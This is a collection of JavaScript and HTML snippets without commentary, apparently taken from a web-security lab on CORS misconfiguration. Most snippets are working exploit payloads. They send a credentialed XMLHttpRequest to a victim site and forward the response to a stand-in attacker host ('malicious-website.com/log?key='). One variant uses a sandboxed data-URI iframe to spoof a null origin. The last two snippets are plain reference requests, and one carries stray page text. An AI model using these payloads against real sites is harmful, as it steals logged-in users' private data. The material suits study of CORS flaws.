```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true;
req.send();
function reqListener() { location='//malicious-website.com/log?key='+this.responseText;
};
```


```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;
req.send();
function reqListener() {
	location='/log?key='+this.responseText;
};
</script>
```


```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true;
req.send();
function reqListener() {
		location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```


```html
<script>
		function loadXMLDoc() {
			var xhr = new XMLHttpRequest();
			xhr.onreadystatechange = function() {
				if(this.readyState == 4 && this.status == 200) {
					var xhr2 = new  XMLHttpRequest
					<!-- console.log(this.responseText); -->
					xhr2.open('GET', 'http://127.0.0.1/s.html/?' + escape(this.responseText));
					xhr2.withCredentials = true
					xhr2.send();

				}
			};
			xhr.open('GET', 'http://127.0.0.1:5000/confidential');
			xhr.withCredentials  = true;
			xhr.send();
		}
		loadXMLDoc();
	</script>
```


```html
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','http://0.0.0.0:5000/confidential', true);
  req.withCredentials = true;
  req.send();

  function reqListener(){
    var foo = document.getElementById("stolenInfo").innerHTML= req.responseText;
    Console.log(foo)
  }
</script>

<p id="stolenInfo"></p>
```


```javascript
const xhr = new XMLHttpRequest();
const url = 'https://site.tld/resources/data/'; 
xhr.open('GET', url); 
xhr.onreadystatechange = handlerFunction; 
xhr.send();
```


```javascript
const invocation = new XMLHttpRequest();
const url = 'http://domain.tld/resources/api/me/data/';
function callOtherDomain () { if (invocation) { invocation.open('GET', url, true);
invocation.withCredentials = true;
invocation.setRequestHeader('Content-Type', 'application/json'); invocation.onreadystatechange = handlerFunction;
invocation.send(); Copy Caption
	}
}
```
